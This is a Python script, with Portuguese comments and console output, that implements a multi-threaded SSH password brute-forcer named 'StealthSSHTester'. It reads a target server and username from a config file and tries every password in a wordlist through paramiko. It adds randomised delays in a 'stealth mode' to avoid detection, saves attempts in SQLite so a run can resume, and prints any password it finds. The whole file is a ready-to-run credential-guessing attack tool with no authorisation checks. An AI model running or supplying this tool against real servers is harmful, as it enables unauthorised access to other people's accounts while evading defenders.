#!/usr/bin/env python3
"""
SSH Password Tester
-----------------

Script desenvolvido para teste de múltiplas senhas SSH com processamento paralelo
e recursos avançados de recuperação e checkpoint.

Autor: Vinicius Azevedo (vynazevedo)
GitHub: https://github.com/vynazevedo
Data: Dezembro 2024

"""

import paramiko
import time
from typing import List, Dict
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from datetime import datetime
import random
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
from rich.panel import Panel
from rich import print as rprint
import platform
import sqlite3
import signal
import sys

console = Console()


class StealthSSHTester:
    def __init__(self):
        self.connection_lock = threading.Lock()
        self.start_time = None
        self.end_time = None
        self.total_errors = 0
        self.total_attempts = 0
        self.found_password = None
        self.progress_db = "ssh_progress.db"
        self.checkpoint_file = "ssh_checkpoint.pkl"
        self.consecutive_failures = 0
        self.dynamic_delay = 0.1
        self.init_database()
        self.setup_signal_handlers()

    def setup_signal_handlers(self):
        signal.signal(signal.SIGINT, self.handle_interrupt)
        signal.signal(signal.SIGTERM, self.handle_interrupt)

    def handle_interrupt(self, signum, frame):
        console.print("\n[yellow]Interrupção detectada. Salvando progresso...[/yellow]")
        console.print("[green]Use --resume para continuar depois.[/green]")
        sys.exit(0)

    def init_database(self):
        with sqlite3.connect(self.progress_db) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS attempts (
                    password TEXT PRIMARY KEY,
                    status TEXT,
                    timestamp DATETIME,
                    error TEXT
                )
            """)
            conn.execute("CREATE INDEX IF NOT EXISTS idx_status ON attempts(status)")

    def simulate_delay(self):
        if self.consecutive_failures > 5:
            time.sleep(random.uniform(1.0, 2.0))
        else:
            time.sleep(random.uniform(0.1, 0.5))

    def test_password(self, args: tuple) -> tuple:
        hostname, username, password, port, timeout = args

        if self.found_password:
            return (password, False, None)

        try:
            with self.connection_lock:
                with sqlite3.connect(self.progress_db) as conn:
                    cursor = conn.execute("SELECT status FROM attempts WHERE password = ?", (password,))
                    result = cursor.fetchone()
                    if result:
                        if result[0] == 'success':
                            self.found_password = password
                            return (password, True, None)
                        return (password, False, "Já tentado")

                self.simulate_delay()

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                ssh.connect(
                    hostname=hostname,
                    username=username,
                    password=password,
                    port=port,
                    timeout=timeout
                )

                self.found_password = password
                self.consecutive_failures = 0
                ssh.close()

                with sqlite3.connect(self.progress_db) as conn:
                    conn.execute(
                        "INSERT OR REPLACE INTO attempts (password, status, timestamp) VALUES (?, ?, ?)",
                        (password, 'success', datetime.now())
                    )

                return (password, True, None)

        except paramiko.AuthenticationException:
            with sqlite3.connect(self.progress_db) as conn:
                conn.execute(
                    "INSERT OR REPLACE INTO attempts (password, status, timestamp, error) VALUES (?, ?, ?, ?)",
                    (password, 'failed', datetime.now(), "Autenticação falhou")
                )
            return (password, False, "Autenticação falhou")

        except Exception as e:
            self.consecutive_failures += 1
            error_msg = str(e)
            with sqlite3.connect(self.progress_db) as conn:
                conn.execute(
                    "INSERT OR REPLACE INTO attempts (password, status, timestamp, error) VALUES (?, ?, ?, ?)",
                    (password, 'error', datetime.now(), error_msg)
                )
            return (password, False, error_msg)

        finally:
            try:
                ssh.close()
            except:
                pass

    def print_progress_summary(self):
        with sqlite3.connect(self.progress_db) as conn:
            total = conn.execute("SELECT COUNT(*) FROM attempts").fetchone()[0]
            success = conn.execute("SELECT COUNT(*) FROM attempts WHERE status = 'success'").fetchone()[0]
            failed = conn.execute("SELECT COUNT(*) FROM attempts WHERE status = 'failed'").fetchone()[0]
            errors = conn.execute("SELECT COUNT(*) FROM attempts WHERE status = 'error'").fetchone()[0]

        table = Table(show_header=False)
        table.add_column("Item", style="cyan")
        table.add_column("Valor", style="yellow")
        table.add_row("Total de tentativas", str(total))
        table.add_row("Sucessos", str(success))
        table.add_row("Falhas", str(failed))
        table.add_row("Erros", str(errors))
        console.print(Panel(table, title="[bold cyan]Progresso Atual[/bold cyan]"))

    def test_passwords_stealth(
            self,
            hostname: str,
            username: str,
            passwords: List[str],
            port: int = 22,
            timeout: int = 5,
            max_workers: int = 3,
            resume: bool = False
    ) -> str:
        self.start_time = datetime.now()

        if resume:
            with sqlite3.connect(self.progress_db) as conn:
                attempted = {row[0] for row in conn.execute("SELECT password FROM attempts")}
                success = conn.execute("SELECT password FROM attempts WHERE status = 'success'").fetchone()
                if success:
                    console.print(f"\n[green]✓ Senha encontrada:[/green] {success[0]}")
                    self.print_progress_summary()
                    return success[0]

            passwords = [p for p in passwords if p not in attempted]
            if not passwords:
                console.print("[yellow]Todas as senhas já foram tentadas[/yellow]")
                self.print_progress_summary()
                return None

        info_table = Table(show_header=False, box=None)
        info_table.add_column("Item", style="cyan")
        info_table.add_column("Valor", style="yellow")
        info_table.add_row("Modo", "Stealth")
        info_table.add_row("Servidor", hostname)
        info_table.add_row("Usuário", username)
        info_table.add_row("Sistema", platform.system())
        info_table.add_row("Total de senhas", str(len(passwords)))
        info_table.add_row("Workers", str(max_workers))
        console.print(Panel(info_table, title="[bold cyan]Configuração[/bold cyan]"))

        with Progress(
                SpinnerColumn(),
                *Progress.get_default_columns(),
                TimeElapsedColumn(),
                console=console,
                transient=False
        ) as progress:
            task = progress.add_task("[cyan]Testando senhas...", total=len(passwords))

            found_password = None

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []

                for password in passwords:
                    if self.found_password:
                        found_password = self.found_password
                        break

                    args = (hostname, username, password, port, timeout)
                    futures.append(executor.submit(self.test_password, args))

                for future in as_completed(futures):
                    if self.found_password:
                        found_password = self.found_password
                        break

                    password, success, error = future.result()
                    progress.advance(task)

                    if success:
                        found_password = password
                        self.found_password = password
                        self.end_time = datetime.now()
                        duration = self.end_time - self.start_time
                        break

        self.end_time = datetime.now()
        if found_password or self.found_password:
            password_to_show = found_password or self.found_password
            duration = self.end_time - self.start_time
            console.print(f"\n[green]✓ Senha encontrada:[/green] {password_to_show}")
            console.print(Panel(f"[cyan]Tempo total:[/cyan] {duration.total_seconds():.2f} segundos"))
        else:
            console.print("[red]Nenhuma senha válida encontrada[/red]")

        self.print_progress_summary()
        return found_password or self.found_password


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='SSH Password Tester - Stealth Mode')
    parser.add_argument('--resume', action='store_true', help='Continuar de onde parou')
    args = parser.parse_args()

    console.clear()
    console.print("[bold cyan]SSH Password Tester - STEALTH MODE[/bold cyan]", justify="center")
    console.print("=" * 50, justify="center")
    console.print()

    with open("config.json", 'r') as f:
        config = json.load(f)

    with open("passwords.txt", 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    tester = StealthSSHTester()
    resultado = tester.test_passwords_stealth(
        hostname=config['server'],
        username=config['username'],
        passwords=passwords,
        port=config.get('port', 22),
        timeout=config.get('timeout', 5),
        max_workers=config.get('max_workers', 3),
        resume=args.resume
    )